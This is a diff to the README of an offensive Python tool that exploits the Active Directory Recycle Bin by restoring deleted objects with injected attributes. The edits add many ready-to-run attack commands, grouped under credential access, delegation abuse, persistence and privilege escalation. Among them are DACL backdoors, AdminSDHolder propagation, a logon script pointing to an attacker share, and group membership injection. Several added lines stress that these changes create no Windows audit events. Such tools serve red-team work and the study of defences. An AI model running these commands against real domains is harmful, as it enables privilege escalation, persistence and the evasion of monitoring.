@@ -2,7 +2,7 @@
 ![Python 3 compatible](https://img.shields.io/badge/python-3.x-blue.svg)
 ![License: MIT](https://img.shields.io/pypi/l/ad-necronomicon.svg)
 
-AD Necronomicon is a Python tool for enumerating and exploiting the Active Directory Recycle Bin. It discovers who can access deleted objects, enumerates the recycle bin contents, and restores deleted objects with attacker-controlled attributes injected atomically during the undelete operation.
+AD Necronomicon is a Python tool for enumerating and exploiting the Active Directory Recycle Bin. It discovers who can access deleted objects, enumerates the recycle bin contents, and restores deleted objects with attacker-controlled attributes injected during the undelete operation.
 
 Built on [Impacket](https://github.com/blacklanternsecurity/impacket) with Kerberos-first authentication and no NTLM fallback by default.
 
@@ -10,7 +10,7 @@ Built on [Impacket](https://github.com/blacklanternsecurity/impacket) with Kerbe
 
 When the AD Recycle Bin is enabled, deleted objects are preserved with all their attributes intact for a configurable retention period (default 180 days). Objects in this state can be restored via LDAP by removing the `isDeleted` attribute and setting a new `distinguishedName`.
 
-The key insight is that **additional LDAP modifications can be bundled atomically with the restore operation**. This means attributes like `nTSecurityDescriptor`, `servicePrincipalName`, `userAccountControl`, `msDS-AllowedToActOnBehalfOfOtherIdentity`, and others can be injected in the same request that brings the object back to life — the object is never restored in a "clean" state.
+The interesting thing is that LDAP modifications can be bundled with the restore operation. This means attributes like `nTSecurityDescriptor`, `servicePrincipalName`, `userAccountControl`, `msDS-AllowedToActOnBehalfOfOtherIdentity`, and others can be injected in the same request that brings the object back to life. Windows logs only the restore itself (5137 object created + 5138 object undeleted) — the injected attribute changes do not generate separate 5136 (object modified), 4738/4742 (account changed), or 4670 (permissions changed) events.
 
 ### Requirements
 
@@ -19,21 +19,19 @@ Restoring deleted objects requires two rights:
 - **Reanimate Tombstones** extended right on the domain root (granted to Domain Admins by default)
 - **List Contents** on the Deleted Objects container (to enumerate what's available)
 
-The `enum-access` subcommand identifies which principals hold these rights from a low-privilege perspective.
-
 ## Installation
 
-```
+```bash
 pipx install .
 ```
 
 Or via pip in a virtual environment:
 
-```
+```bash
 pip install .
 ```
 
-This installs the `necronomicon` command line tool and pulls in all dependencies including the BLS Impacket fork.
+This installs the `necronomicon` command line tool and pulls in all dependencies, including BLS's Impacket fork.
 
 ## Usage
 
@@ -41,9 +39,9 @@ AD Necronomicon has three subcommands:
 
 ### enum-access — Discover Who Can Access the Recycle Bin
 
-Enumerates the Reanimate Tombstones extended right on the domain object and List Contents access on the Deleted Objects container. Runs from a low-privilege account.
+Enumerates the Reanimate Tombstones extended right on the domain object and List Contents access on the Deleted Objects container. Runs from a low-privilege account. Generates no events in Windows.
 
-```
+```bash
 necronomicon enum-access -d corp.local -u lowpriv -k -dc dc01.corp.local
 ```
 
@@ -57,9 +55,9 @@ Optional: `-o findings.json` to write JSON output.
 
 ### enum-bin — Enumerate Deleted Objects
 
-Lists all deleted objects in the Recycle Bin, grouped by type and restorability. Requires List Contents on the Deleted Objects container.
+Lists all deleted objects in the Recycle Bin, grouped by type and restorability. Requires List Contents on the Deleted Objects container. Generates no events in Windows.
 
-```
+```bash
 necronomicon enum-bin -d corp.local -u admin -k -dc dc01.corp.local
 ```
 
@@ -69,12 +67,19 @@ Output includes:
 - Objects with `description` or `info` fields populated (potential credential exposure)
 - Structured JSON output written to `deleted_objects.json` (override with `-o`)
 
-### inject — Restore with Injected Attributes
+### restore — Restore Deleted Objects
 
-Restores a deleted object from the Recycle Bin while atomically injecting arbitrary LDAP attribute modifications. Targets are specified by GUID, SID, sAMAccountName, or name.
+Restores a deleted object from the Recycle Bin. Optionally injects arbitrary LDAP attribute modifications during the restore. Targets are specified by GUID, SID, sAMAccountName, or name. Restoring an account creates a 5137 + 5138 event pair in Windows. Injected attributes generate no additional events.
 
-```
-necronomicon inject -d corp.local -u admin -k -dc dc01.corp.local \
+```bash
+# Plain restore
+necronomicon restore -d corp.local -u admin -k -dc dc01.corp.local --target victim
+
+# Restore and enable the account
+necronomicon restore -d corp.local -u admin -k -dc dc01.corp.local --target victim --enable
+
+# Restore with attribute injection
+necronomicon restore -d corp.local -u admin -k -dc dc01.corp.local \
   --target victim --set userAccountControl=544 --set pwdLastSet=0
 ```
 
@@ -102,31 +107,91 @@ Binary security descriptors cannot be passed as CLI strings, so convenience flag
 
 | Flag | Description |
 |------|-------------|
+| `--enable` | Clear ACCOUNTDISABLE in userAccountControl so the account is active on restore. Does not generate a 4722 (account enabled) event. |
 | `--target-ou DN` | Override the restore location (required if the original parent OU is also deleted) |
 | `--restore-name NAME` | Override the restored object's RDN |
 
 #### Examples
 
+**Credential Access**
+
 ```bash
-# Add an SPN for Kerberoasting
-necronomicon inject -d corp.local -u admin -k --target svc_sql \
+# Empty password. Account PASSWD_NOTREQD + pwdLastSet=0
+necronomicon restore -d corp.local -u admin -k --target victim \
+  --set userAccountControl=544 --set pwdLastSet=0
+
+# Kerberoastable SPN. Request TGS and crack offline
+necronomicon restore -d corp.local -u admin -k --target svc_sql \
   --add servicePrincipalName=MSSQLSvc/db.corp.local:1433
 
-# RBCD injection
-necronomicon inject -d corp.local -u admin -k --target comp$ \
+# Certificate mapping. Authenticate as the restored account via PKINIT
+necronomicon restore -d corp.local -u admin -k --target victim \
+  --add altSecurityIdentities='X509:<I>DC=local,DC=corp,CN=corp-CA<S>CN=attacker'
+```
+
+**Delegation Abuse**
+
+```bash
+# RBCD. S4U2Self/S4U2Proxy impersonation via the restored object
+necronomicon restore -d corp.local -u admin -k --target comp$ \
   --sd-rbcd S-1-5-21-...-1234
 
-# Inject Everyone:FullControl DACL
-necronomicon inject -d corp.local -u admin -k --target victim \
+# Constrained delegation. Impersonate any user to a target SPN
+necronomicon restore -d corp.local -u admin -k --target comp$ \
+  --set msDS-AllowedToDelegateTo=cifs/dc01.corp.local
+
+# Unconstrained delegation. Capture TGTs from authenticating principals
+necronomicon restore -d corp.local -u admin -k --target comp$ \
+  --set userAccountControl=528384
+```
+
+**Persistence**
+
+```bash
+# DACL backdoor. Everyone:FullControl on the restored object
+necronomicon restore -d corp.local -u admin -k --target victim \
   --sd-everyone
 
-# Restore into a specific OU with a new name
-necronomicon inject -d corp.local -u admin -k --target victim \
-  --set scriptPath='\\attacker\share\run.bat' \
+# DACL backdoor for a specific principal
+necronomicon restore -d corp.local -u admin -k --target victim \
+  --sd-principal S-1-5-21-...-1234
+
+# Logon script. Code execution when the restored account logs in
+necronomicon restore -d corp.local -u admin -k --target victim \
+  --set scriptPath='\\attacker\share\run.bat'
+
+# GPO link. Restore a deleted OU with a linked GPO for code execution
+necronomicon restore -d corp.local -u admin -k --target 'Finance' \
+  --set 'gPLink=[LDAP://CN={GPO-GUID},CN=Policies,CN=System,DC=corp,DC=local;0]'
+
+# AdminSDHolder. Restore into AdminSDHolder so SDProp propagates
+# the injected DACL to all protected accounts within 60 minutes
+necronomicon restore -d corp.local -u admin -k --target victim \
+  --sd-everyone \
+  --target-ou 'CN=AdminSDHolder,CN=System,DC=corp,DC=local'
+```
+
+**Privilege Escalation**
+
+```bash
+# Group member injection. Restore a deleted group with an injected member
+necronomicon restore -d corp.local -u admin -k --target yourgroup \
+  --add member='CN=Attacker,CN=Users,DC=corp,DC=local'
+
+# RODC password reveal. Add Domain Admins to the RODC replication allow list
+necronomicon restore -d corp.local -u admin -k --target fakeRODC$ \
+  --add msDS-RevealOnDemandGroup='CN=Domain Admins,CN=Users,DC=corp,DC=local'
+```
+
+**Combined**
+
+```bash
+# Restore with a new name into a specific OU
+necronomicon restore -d corp.local -u admin -k --target victim \
   --target-ou 'OU=Servers,DC=corp,DC=local' --restore-name svc_backup
 
-# Combine multiple injections in one restore
-necronomicon inject -d corp.local -u admin -k --target victim \
+# Stack multiple injections in a single restore
+necronomicon restore -d corp.local -u admin -k --target victim \
   --set userAccountControl=528384 \
   --add servicePrincipalName=HTTP/web.corp.local \
   --sd-everyone
@@ -134,7 +199,7 @@ necronomicon inject -d corp.local -u admin -k --target victim \
 
 ## Authentication
 
-Kerberos is the default and recommended authentication method. NTLM requires an explicit `--auth-method ntlm` flag and is never used as a fallback.
+Kerberos is the default authentication method. NTLM requires an explicit `--auth-method ntlm` flag.
 
 | Method | Flags |
 |--------|-------|
